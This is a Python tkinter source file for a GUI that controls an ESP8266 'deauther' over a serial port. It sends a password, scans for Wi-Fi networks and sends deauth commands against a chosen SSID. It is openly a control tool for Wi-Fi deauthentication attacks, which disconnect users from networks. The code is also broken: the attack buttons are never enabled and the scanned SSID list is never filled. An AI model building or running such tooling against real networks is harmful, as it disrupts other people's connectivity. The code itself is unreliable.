import serial
import time
import tkinter as tk
from tkinter import scrolledtext, simpledialog, messagebox, Listbox
import serial.tools.list_ports

def detect_serial_port():
    ports = list(serial.tools.list_ports.comports())
    for p in ports:
        return p.device
    return None

class DeautherApp:
    def __init__(self, root):
        self.ser = None
        self.connected = False
        self.password_authenticated = False
        self.ssid_list = []

        self.root = root
        self.root.title("ESP8266 Deauther Control")

        # Create GUI elements
        self.text_area = scrolledtext.ScrolledText(self.root, width=50, height=15)
        self.text_area.grid(column=0, row=1, padx=10, pady=10)

        self.entry = tk.Entry(self.root, width=50)
        self.entry.grid(column=0, row=2, padx=10, pady=10)

        self.connect_button = tk.Button(self.root, text="Connect", command=self.connect_esp)
        self.connect_button.grid(column=0, row=0, padx=10, pady=10)

        self.scan_button = tk.Button(self.root, text="Scan Networks", command=self.scan_networks, state=tk.DISABLED)
        self.scan_button.grid(column=0, row=3, padx=10, pady=10)

        self.ssid_listbox = Listbox(self.root, height=5)
        self.ssid_listbox.grid(column=0, row=4, padx=10, pady=10)

        self.deauth_button = tk.Button(self.root, text="Deauth Selected SSID", command=self.deauth_ssid, state=tk.DISABLED)
        self.deauth_button.grid(column=0, row=5, padx=10, pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Attack", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.grid(column=0, row=6, padx=10, pady=10)

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def connect_esp(self):
        if self.connected:
            messagebox.showinfo("Info", "Already connected to ESP8266!")
            return

        port = detect_serial_port()  # Automatically detect the USB port
        if not port:
            messagebox.showerror("Error", "No ESP8266 device found.")
            return

        try:
            self.ser = serial.Serial(port, 115200, timeout=1)
            self.connected = True
            self.text_area.insert(tk.END, f"Connected to {port}\n")
            self.ask_password()
            self.root.after(100, self.read_serial)  # Start reading serial output
        except Exception as e:
            self.text_area.insert(tk.END, f"Failed to connect to {port}: {e}\n")

    def ask_password(self):
        if self.password_authenticated:
            return  # Skip if already authenticated

        password = simpledialog.askstring("Password", "Enter password:", show='*')
        if password and self.ser:
            self.ser.write((password + '\n').encode())  # Send password to ESP8266
            time.sleep(1)  # Wait for response

    def read_serial(self):
        if self.ser and self.connected:
            while self.ser.in_waiting > 0:
                output = self.ser.readline().decode('utf-8').strip()
                self.text_area.insert(tk.END, output + '\n')  # Display output in text area
                self.text_area.see(tk.END)  # Scroll to the end of the text area
        self.root.after(100, self.read_serial)  # Continue reading serial output

    def scan_networks(self):
        if self.ser and self.connected:
            self.ser.write(b'scan\n')
            time.sleep(2)
            self.ssid_listbox.delete(0, tk.END)  # Clear previous SSIDs
            self.ssid_list = []

    def deauth_ssid(self):
        selected_index = self.ssid_listbox.curselection()
        if selected_index:
            selected_ssid = self.ssid_list[selected_index[0]]
            if self.ser and self.connected:
                command = f"deauth {selected_ssid}\n"
                self.ser.write(command.encode())
                self.text_area.insert(tk.END, f"Sent deauth command for {selected_ssid}\n")

    def stop_attack(self):
        if self.ser and self.connected:
            self.ser.write(b'stop\n')
            self.text_area.insert(tk.END, "Stopped attack.\n")

    def on_closing(self):
        if self.ser:
            self.ser.close()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = DeautherApp(root)
    root.mainloop()
